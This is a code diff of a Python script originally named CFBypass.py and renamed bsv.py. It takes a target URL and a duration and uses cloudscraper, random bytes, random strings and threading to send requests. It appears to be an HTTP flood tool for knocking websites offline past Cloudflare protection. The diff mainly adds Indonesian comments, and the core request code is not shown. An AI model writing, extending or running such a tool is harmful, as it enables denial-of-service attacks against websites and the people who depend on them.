@@ -6,20 +6,25 @@ import string
 import time
 import threading
 
+# Mendapatkan URL dan interval waktu dari argumen
 url = sys.argv[1]
 time_interval = int(sys.argv[2])
 
+# Memastikan bahwa skrip dijalankan dengan argumen yang benar
 if len(sys.argv) <= 2:
-    print('Usage: python CFBypass.py <url> <time>')
+    print('Usage: python bsv.py <url> <time>')
     sys.exit(-1)
 
+# Fungsi untuk menghasilkan byte acak
 def random_byte():
     return str(random.randint(0, 255))
 
+# Fungsi untuk menghasilkan string acak
 def random_string_generate(length):
     characters = string.ascii_lowercase + string.digits
     return ''.join(random.choice(characters) for i in range(length))
 
+# Fungsi untuk mengirim permintaan
 def kirim_pengiriman():
     scraper = cloudscraper.create_scraper()
     try:
@@ -44,6 +49,7 @@ def kirim_pengiriman():
     except Exception as e:
         print('Failed to get website data:', e)
 
+# Fungsi utama untuk mengelola threading
 def main():
     interval = time_interval
     start_time = time.time()
